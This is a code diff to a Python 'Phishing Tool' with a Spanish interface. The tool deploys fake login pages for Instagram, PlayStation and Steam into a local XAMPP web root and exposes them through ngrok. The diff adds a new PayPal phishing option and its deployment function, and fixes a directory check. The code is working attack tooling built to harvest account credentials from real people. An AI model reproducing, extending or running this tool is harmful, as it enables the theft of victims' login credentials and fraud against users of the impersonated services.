@@ -9,7 +9,7 @@ init(convert=True)
 
 ruta = 'C:\%xampp\%php\%www'
 
-v = 'dev 1.0'
+v = '1.0'
 r = Fore.LIGHTRED_EX
 g = Fore.LIGHTGREEN_EX
 c = Fore.LIGHTCYAN_EX
@@ -34,10 +34,10 @@ def clear():
 def menu():
     clear()
     fix = ruta.replace('%', '')
-    if (path.isfile(fix) != True):
-        os.mkdir(fix)
-    else:
+    if (path.exists(fix)):
         pass
+    else:
+        os.mkdir(fix)
     print(f'''
     {c}Phishing Tool 
 
@@ -49,6 +49,7 @@ def menu():
     {r}[1] {y}Instagram
     {r}[2] {y}PlayStation
     {r}[3] {y}Steam
+    {r}[4] {y}PayPal ({c}Nuevo!{Fore.RESET}{y})
     
     {Fore.RESET}
     ''')
@@ -67,6 +68,8 @@ def menu():
             play()
         if (i == 3):
             steam()
+        if (i == 4):
+            paypal()
         else:
             print(c+'La opcion '+r+i+c+' no existe')
             time.sleep(1)
@@ -84,6 +87,17 @@ def instagram():
     finally:
         clear()
         empezar_ngrok()
+
+def paypal():
+    try:
+        fix = ruta.replace('%', '')
+        carpeta = '.\Pages\paypal\*'
+        comando = f'XCOPY {carpeta} {fix} /s'
+        os.system(comando)
+    finally:
+        clear()
+        empezar_ngrok()
+
 
 def play():
     try:
